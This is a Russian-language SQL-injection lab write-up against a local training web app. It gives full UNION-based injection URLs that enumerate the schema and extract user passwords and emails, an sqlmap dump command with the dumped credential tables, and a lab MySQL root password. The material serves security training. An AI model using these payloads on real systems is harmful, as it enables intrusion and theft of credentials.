### Получение данных через SQLi:

1. Выполню установку БД с web-страницы согласно заданию
http://192.168.1.17:8080

2. Начну смотреть данные с web-страницы
http://192.168.1.17:8080/task/

2.1. Здесь мне предложено ввести в качестве параметра id (видимо пользователя)

Добавляю параметр (id=1) и вижу результат с логином "admin"
http://192.168.1.17:8080/task?id=1
http://192.168.1.17:8080/task?id=2
...

#### Получение данных ["вручную"]

##### Переберу id от 1 до 10
http://192.168.1.17:8080/task?id=1 -- (admin)
http://192.168.1.17:8080/task?id=2 -- (Volk)
http://192.168.1.17:8080/task?id=3 -- (Matroskin)
http://192.168.1.17:8080/task?id=4 -- (Vinni-pukh)
http://192.168.1.17:8080/task?id=5 -- (Neznaika)
http://192.168.1.17:8080/task?id=6 -- (kotenok)
http://192.168.1.17:8080/task?id=7 -- (Karlson)
http://192.168.1.17:8080/task?id=8 -- (Kesha)
http://192.168.1.17:8080/task?id=9 -- (Volk2)
http://192.168.1.17:8080/task?id=10 -- (пусто)

Как видно, в этой таблице всего 9 записей
<br/>

##### Проверю id 0,-1
<a>http://192.168.1.17:8080/task/?id=0 -- (пусто)
<a>http://192.168.1.17:8080/task?id=-1 -- (пусто)
<br/>
##### Попробую подобрать запрос (в.т.ч. количество колонок)
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT 1 -- -</a> (Неудачно) The used SELECT statements have a different number of columns
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT 1,1 -- -</a> (Неудачно) The used SELECT statements have a different number of columns
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT 1,1,1 -- -</a> (Удачно)
Предположу, что каждый запрос должен возвращать именно 3 колонки
<br/>

##### Получу список таблиц текущей БД (в строку)
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ';'),database(),null FROM information_schema.TABLES WHERE table_schema=database()-- -</a>

|Database|Tables|
|-|-|
|security|emails<br/>users|
<br/>

##### Получу имена колонок таблиц (всё так же в строку)
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ';'),null,null FROM information_schema.COLUMNS WHERE table_schema=database() AND TABLE_NAME = 'users'-- -</a>

|Table|Columns|
|-|-|
|users|id<br/>username<br/>password|
<br/>

<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT null,GROUP_CONCAT(column_name SEPARATOR ';'),null FROM information_schema.COLUMNS WHERE table_schema=database() AND TABLE_NAME = 'emails'-- -</a>

|Table|Columns|
|-|-|
|emails|id<br/>email_id|
<br/>

##### Получу данные пользователя с id=9 из таблицы users
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT username,password,null FROM users WHERE id=9-- -</a>

|Login|Password|
|-|-|
|Volk2|Wa spoiuuuuu|
<br/>

##### Получу данные email пользователя с ником Vinni-pukh
<a>http://192.168.1.17:8080/task?id=-1' UNION SELECT GROUP_CONCAT(id,"-",email_id),null,null FROM emails -- -</a>

Из ранее полученных данных я знаю что у пользователя Vinni-pukh, id=4. Буду ориентироваться на эти данные
Получаю результат:
  |id (table users)|username|email|
  |-|-|-|
  |4|Vinni-pukh|honey_lover@otus-lab.com|
<br/>

---

#### Получение данных ["автоматически"] [SQLMap](https://github.com/sqlmapproject/sqlmap)
<br/>попробую снять дамп с БД...
<br/>python ./sqlmap.py -u "http://192.168.1.17:8080/task/?id=1" --dump
<br/>Готово

##### Получены файлы:
- users.csv
- emails.csv

##### Посмотрю таблицу users.csv

|id|password|username|
|-|-|-|
|1|kjhsd8@j0dfjk3$%jksli|admin|
|2|nu zayzc, nu pogodi!|Volk|
|3|a ya vse chawe zame4aiu, 4to menya kak budto kto-to podmenil|Matroskin|
|4|Ya tu4ka-tu4ka-tu4ka|Vinni-pukh|
|5|na Lune|Neznaika|
|6|Gav|kotenok|
|7|muwchina v samom rascvete sil|Karlson|
|8|pust vsegda budet Vovka |Kesha|
|9|Wa spoiuuuuu|Volk2|

Получен пароль пользователя Volk2
<br/>User: Volk2
<br/>Password: Wa spoiuuuuu

##### Посмотрю таблицу emails.csv
|id|email_id|
|-|-|
|1|admin@otus-lab.com|
|2|volchara1969@otus-lab.com|
|3|matroskin_is_prostokvashino@otus-lab.com|
|4|honey_lover@otus-lab.com|
|5|ne.znaika@otus-lab.com|
|6|kotenok@otus-lab.com|
|7|karlson@otus-lab.com|
|9|volk@otus-lab.com|

Получен почтовый ящик пользователя с ником Vinni-pukh (соответствие id=4)
<br/>User: Vinni-pukh (id=4 table Users)
<br/>Email: honey_lover@otus-lab.com

### Другой вариант получения всех таблиц и данных (обычный вход в БД MySQL)
(т.к. в docker-compose уже оставлен пароль администратора БД)
server: 192.168.1.17
port: 8989
login: root
password: Vdjo7#l-er

